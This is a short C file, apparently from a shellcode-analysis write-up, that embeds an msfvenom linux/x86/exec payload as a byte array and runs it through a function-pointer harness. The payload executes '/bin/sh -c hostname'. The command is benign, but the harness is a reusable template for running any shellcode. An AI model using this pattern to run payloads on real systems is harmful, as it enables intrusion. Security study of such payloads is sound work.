/* 
 *  Title:    Msfvenom linux/x86/exec Analysis
 *  Platform: Linux/x86
 *  Date:     2015-08-13
 *  Author:   Julien Ahrens (@MrTuxracer)
 *  Website:  http://www.rcesecurity.com 
 *
*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x09\x00\x00\x00\x68\x6f\x73\x74\x6e\x61\x6d\x65\x00\x57\x53\x89\xe1\xcd\x80";

main()
{
	//printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}
